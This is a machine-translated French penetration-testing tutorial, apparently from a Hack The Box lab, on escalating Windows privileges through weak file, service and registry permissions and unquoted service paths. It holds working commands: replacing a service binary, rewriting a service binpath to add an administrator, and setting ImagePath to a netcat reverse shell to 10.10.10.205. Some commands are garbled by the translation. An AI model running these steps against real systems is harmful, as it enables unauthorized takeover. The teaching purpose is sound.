Autorisations faibles
================

* * * * *

Les autorisations sur les systèmes Windows sont compliquées et difficiles à obtenir correctement. Une légère modification à un endroit peut introduire un défaut ailleurs. En tant que testeurs d'intrusion, nous devons comprendre le fonctionnement des autorisations dans Windows et les différentes façons dont les erreurs de configuration peuvent être exploitées pour élever les privilèges. Les failles liées aux autorisations abordées dans cette section sont relativement rares dans les applications logicielles proposées par les grands fournisseurs (mais sont observées de temps en temps), mais sont courantes dans les logiciels tiers de petits fournisseurs, les logiciels open source et les applications personnalisées. Les services s'installent généralement avec les privilèges SYSTEM, donc l'exploitation d'une faille liée aux autorisations de service peut souvent conduire à un contrôle complet sur le système cible. Quel que soit l'environnement, nous devons toujours vérifier les autorisations faibles et pouvoir le faire à la fois à l'aide d'outils et manuellement au cas où nous ne disposerions pas de nos outils facilement disponibles.

* * * * *

ACL permissives du système de fichiers
---------------------------

#### Exécution de SharpUp

Nous pouvons utiliser [SharpUp](https://github.com/GhostPack/SharpUp/) de la suite d'outils GhostPack pour vérifier les fichiers binaires de service souffrant d'ACL faibles.

Exécution de SharpUp

```
PS C:\htb> .\SharpUp.exe audit

=== SharpUp : Exécuter des vérifications d'escalade de privilèges ===

=== Fichiers binaires de service modifiables ===

   Nom : SecurityService
   Nom d'affichage : Service de gestion de la sécurité PC
   Description : Responsable de la gestion de la sécurité des PC
   Etat : Arrêté
   Mode de démarrage : Auto
   Nom du chemin : "C:\Program Files (x86)\PCProtect\SecurityService.exe"

   <SNIP>

```

L'outil identifie le `PC Security Management Service`, qui exécute le binaire `SecurityService.exe` au démarrage.

#### Vérification des autorisations avec icacls

À l'aide [icacls](https://ss64.com/nt/icacls.html) nous pouvons vérifier la vulnérabilité et voir que les groupes `EVERYONE` et `BUILTIN\Users` ont reçu des autorisations complètes sur le répertoire, et donc tout un utilisateur système non privilégié peut manipuler le répertoire et son contenu.

Vérification des autorisations avec icacls

```
PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users :(I)(F)
                                                      Tout le monde :(I)(F)
                                                      AUTORITÉ NT\SYSTÈME :(I)(F)
                                                      INTÉGRÉ\Administrateurs :(I)(F)
                                                      AUTORITÉ DU PACKAGE D'APPLICATION\TOUS LES PACKAGES D'APPLICATION :(I)(RX)
                                                      AUTORITÉ DU PACKAGE D'APPLICATION\TOUS LES PACKAGES D'APPLICATION RESTREINTS :(I)(RX)

Traitement réussi de 1 fichiers ; Échec du traitement de 0 fichiers

```

#### Remplacement du binaire du service

Ce service peut également être démarré par des utilisateurs non privilégiés, nous pouvons donc faire une sauvegarde du binaire d'origine et le remplacer par un binaire malveillant généré avec `msfvenom`. Il peut nous donner un shell inversé en tant que `SYSTEM`, ou ajouter un utilisateur administrateur local et nous donner un contrôle administratif total sur la machine.

Remplacement du binaire de service

```
C:\htb> cmd /c copie /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\htb> sc start SecurityService

```

* * * * *

Autorisations de service faibles
------------------------

#### Revoir SharpUp à nouveau

Vérifions à nouveau la sortie `SharpUp` pour tous les services modifiables. Nous constatons que `WindscribeService` est potentiellement mal configuré.

Revoir SharpUp à nouveau

```
C:\htb> Audit SharpUp.exe

=== SharpUp : Exécuter des vérifications d'escalade de privilèges ===

=== Services modifiables ===

   Nom : WindscribeService
   Nom d'affichage : WindscribeService
   Description : Gère le pare-feu et contrôle le tunnel VPN
   Etat : En cours d'exécution
   Mode de démarrage : Auto
   Nom du chemin : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"

```

#### Vérification des autorisations avec AccessChk

Ensuite, nous utiliserons [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) de la suite Sysinternals pour énumérer les autorisations sur le service. Les indicateurs que nous utilisons, dans l'ordre, sont `-q` (omettre la bannière), `-u` (supprimer les erreurs), `-v` (verbeux), `-c` (spécifier le nom d'un service Windows) et ` -w` (afficher uniquement les objets disposant d'un accès en écriture). Ici, nous pouvons voir que tous les utilisateurs authentifiés ont [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) droits sur le service, ce qui signifie contrôle total en lecture/écriture sur celui-ci.

Vérification des autorisations avec AccessChk

```
C:\htb> accesschk.exe /accepteula -quvcw WindscribeService

Accesschk v6.13 - Signale les autorisations effectives pour les objets sécurisables
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

WindscribeService
   Niveau obligatoire moyen (par défaut) [Pas de rédaction]
   RW NT AUTORITY\SYSTEM
         SERVICE_ALL_ACCESS
   RW INTÉGRÉ\Administrateurs
         SERVICE_ALL_ACCESS
   RW NT AUTHORITY\Utilisateurs authentifiés
         SERVICE_ALL_ACCESS

```

#### Vérifier le groupe d'administrateurs locaux

La vérification du groupe d'administrateurs locaux confirme que notre utilisateur `htb-student` n'est pas membre.

Vérifier le groupe d'administrateurs locaux

```
C:\htb> administrateurs du groupe local net

Administrateurs de noms d'alias
Commentaire Les administrateurs ont un accès complet et illimité à l'ordinateur/au domaine

Membres

-------------------------------------------------- -----------------------------
Administrateur
mrb3n
La commande s'est terminée avec succès.

```

#### Modification du chemin binaire du service

Nous pouvons utiliser nos autorisations pour modifier le chemin binaire de manière malveillante. Modifions-le pour ajouter notre utilisateur au groupe d'administrateurs locaux. Nous pourrions définir le chemin binaire pour exécuter n'importe quelle commande ou exécutable de notre choix (comme un binaire shell inversé).

Modification du chemin binaire du service

```
C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

[SC] RÉUSSITE de ChangeServiceConfig

```

#### Arrêt du service

Ensuite, nous devons arrêter le service, afin que la nouvelle commande `binpath` s'exécute au prochain démarrage.

Arrêt du service

```
C:\htb> sc stop WindscribeService

SERVICE_NAME : service Windscribe
         TYPE : 10 WIN32_OWN_PROCESS
         ÉTAT : 3 STOP_PENDING
                                 (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
         WIN32_EXIT_CODE : 0 (0x0)
         SERVICE_EXIT_CODE : 0 (0x0)
         POINT DE CONTRÔLE : 0x4
         WAIT_HINT : 0x0

```

#### Démarrage du service

Puisque nous avons un contrôle total sur le service, nous pouvons le redémarrer, et la commande que nous avons placée dans `binpath` s'exécutera même si un message d'erreur est renvoyé. Le service ne démarre pas car le `binpath` ne pointe pas vers l'exécutable du service réel. Néanmoins, l'exécutable s'exécutera lorsque le système tentera de démarrer le service avant de se tromper et d'arrêter à nouveau le service, en exécutant la commande que nous spécifions dans le `binpath`.

Démarrage du service

```
C:\htb> sc démarrer WindscribeService

[SC] ÉCHEC du service de démarrage 1053 :

Le service n'a pas répondu à la demande de démarrage ou de contrôle en temps opportun.

```

#### Confirmation de l'ajout du groupe d'administrateurs locaux

Enfin, vérifiez pour confirmer que notre utilisateur a été ajouté au groupe des administrateurs locaux.

Confirmation de l'ajout du groupe d'administrateurs locaux

```
C:\htb> administrateurs du groupe local net

Administrateurs de noms d'alias
Commentaire Les administrateurs ont un accès complet et illimité à l'ordinateur/au domaine

Membres

-------------------------------------------------- -----------------------------
Administrateur
htb-étudiant
mrb3n
La commande s'est terminée avec succès.

```

Un autre exemple notable est le [service d'orchestrateur de mise à jour (UsoSvc)](https://docs.microsoft.com/en-us/windows/deployment/update/how-windows-update-works) de Windows, qui est responsable du téléchargement et installation des mises à jour du système d'exploitation. Il est considéré comme un service Windows essentiel et ne peut pas être supprimé. Puisqu'il est chargé d'apporter des modifications au système d'exploitation via l'installation de mises à jour de sécurité et de fonctionnalités, il s'exécute en tant que compte `NT AUTHORITY\SYSTEM` tout-puissant. Avant d'installer le correctif de sécurité relatif à [CVE-2019-1322](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1322), il était possible d'élever les privilèges d'un compte de service à `SYSTEM`. Cela était dû à des autorisations faibles, qui permettaient aux comptes de service de modifier le chemin binaire du service et de démarrer/arrêter le service.

* * * * *

Autorisations de service faibles - Nettoyage
----------------------------------

Nous pouvons nettoyer après nous-mêmes et nous assurer que le service fonctionne correctement en l'arrêtant et en réinitialisant le chemin binaire vers l'exécutable du service d'origine.

#### Inverser le chemin binaire

Inverser le chemin binaire

```
C:\htb> sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"

[SC] RÉUSSITE de ChangeServiceConfig

```

#### Redémarrer le service

Si tout se passe comme prévu, nous pouvons recommencer le service sans problème.

Redémarrer le service

```
C:\htb> sc démarrer WindScribeService

SERVICE_NAME : service WindScribe
         TYPE : 10 WIN32_OWN_PROCESS
         ÉTAT : 2 START_PENDING
                                 (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
         WIN32_EXIT_CODE : 0 (0x0)
         SERVICE_EXIT_CODE : 0 (0x0)
         POINT DE CONTRÔLE : 0x0
         WAIT_HINT : 0x0
         NIP : 1716
         DRAPEAUX :

```

#### Vérification que le service est en cours d'exécution

L'interrogation du service montrera qu'il fonctionne à nouveau comme prévu.

Vérifier que le service est en cours d'exécution

```
C:\htb> sc requête WindScribeService

SERVICE_NAME : service WindScribe
         TYPE : 10 WIN32_OWN_PROCESS
         ÉTAT : 4 En cours d'exécution
                                 (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
         WIN32_EXIT_CODE : 0 (0x0)
         SERVICE_EXIT_CODE : 0 (0x0)
         POINT DE CONTRÔLE : 0x0
         WAIT_HINT : 0x0

```

* * * * *

Chemin de service non cité
---------------------

Lorsqu'un service est installé, la configuration du registre spécifie un chemin vers le binaire qui doit être exécuté au démarrage du service. Si ce binaire n'est pas encapsulé entre guillemets, Windows tentera de localiser le binaire dans différents dossiers. Prenez l'exemple de chemin binaire ci-dessous.

#### Chemin binaire du service

Chemin binaire du service

```
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe

```

Windows décidera de la méthode d'exécution d'un programme en fonction de son extension de fichier, il n'est donc pas nécessaire de la spécifier. Windows tentera de charger les exécutables potentiels suivants dans l'ordre au démarrage du service, avec un .exe implicite :

- `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64`

#### Service d'interrogation

Service d'interrogation

```
C:\htb> sc qc SystemExplorerHelpService

[SC] QueryServiceConfig RÉUSSITE

SERVICE_NAME : service d'aide de l'explorateur système
         TYPE : 20 WIN32_SHARE_PROCESS
         START_TYPE : 2 AUTO_START
         ERROR_CONTROL : 0 IGNORER
         BINARY_PATH_NAME : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
         LOAD_ORDER_GROUP :
         MARQUE : 0
         DISPLAY_NAME : service de l'explorateur système
         DEPENDANCES :
         SERVICE_START_NAME : système local

```

Si nous pouvons créer les fichiers suivants, nous serions en mesure de détourner le fichier binaire du service et d'obtenir l'exécution de la commande dans le contexte du service, dans ce cas `NT AUTHORITY\SYSTEM`.

- `C:\Programme.exe\`
- `C:\Program Files (x86)\System.exe`

Cependant, la création de fichiers à la racine du lecteur ou du dossier des fichiers de programme nécessite des privilèges d'administration. Même si le système avait été mal configuré pour permettre cela, l'utilisateur ne serait probablement pas en mesure de redémarrer le service et dépendrait d'un redémarrage du système pour augmenter les privilèges. Bien qu'il ne soit pas rare de trouver des applications avec des chemins de service non cités, ce n'est pas souvent exploitable.

#### Recherche de chemins de service non cités

Nous pouvons identifier les chemins binaires de service sans guillemets à l'aide de la commande ci-dessous.

Recherche de chemins de service non cités

```
C:\htb> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
GVFS.Service GVFS.Service C:\Program Files\GVFS\GVFS.Service.exe Auto
Service de l'Explorateur système SystemExplorerHelpService C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe Auto
WindscribeService WindscribeService C:\Program Files (x86)\Windscribe\WindscribeService.exe Automatique

```

* * * * *

ACL de registre permissives
------------------------

Il vaut également la peine de rechercher les ACL de service faibles dans le registre Windows. Nous pouvons le faire en utilisant `accesschk`.

#### Vérification des ACL de service faibles dans le registre

Vérification des ACL de service faibles dans le registre

```
C:\htb> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services

Accesschk v6.13 - Signale les autorisations effectives pour les objets sécurisables
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

RW HKLM\System\CurrentControlSet\services\ModelManagerService
         KEY_ALL_ACCESS

<SNIP>

```

#### Changer ImagePath avec PowerShell

Nous pouvons en abuser en utilisant l'applet de commande PowerShell `Set-ItemProperty` pour modifier la valeur `ImagePath` , à l'aide d'une commande telle que :

Changer ImagePath avec PowerShell

```
PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443 "

```

* * * * *

Binaire d'exécution automatique du registre modifiable
----------------------------------

#### Vérifier les programmes de démarrage

Nous pouvons utiliser WMIC pour voir quels programmes s'exécutent au démarrage du système. Supposons que nous ayons des autorisations d'écriture dans le registre pour un binaire donné ou que nous puissions écraser un binaire répertorié. Dans ce cas, nous pourrons peut-être élever les privilèges à un autre utilisateur la prochaine fois que l'utilisateur se connectera.

Vérifier les programmes de démarrage

```
PS C:\htb> Get-CimInstance Win32_StartupCommand | sélectionnez le nom, la commande, l'emplacement, l'utilisateur |fl

Nom : One Drive
commande : "C:\Users\mrb3n\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
Emplacement : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Utilisateur : WINLPE-WS01\mrb3n

Nom : Windscribe
commande : "C:\Program Files (x86)\Windscribe\Windscribe.exe" -os_restart
Emplacement : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Exécuter
Utilisateur : WINLPE-WS01\mrb3n

Nom : SecurityHealth
commande : %windir%\system32\SecurityHealthSystray.exe
Emplacement : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Utilisateur : Publique

Nom : Processus utilisateur VMware
commande : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
Emplacement : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Utilisateur : Publique

Nom : Processus VMware VM3DService
commande : "C:\WINDOWS\system32\vm3dservice.exe" -u
Emplacement : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Utilisateur : Publique

```

Ce [post](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries) et [ce site](https://www.microsoftpressstore.com /articles/article.aspx?p=2762082&seqNum=2) détaillent de nombreux emplacements d'exécution automatique potentiels sur les systèmes Windows.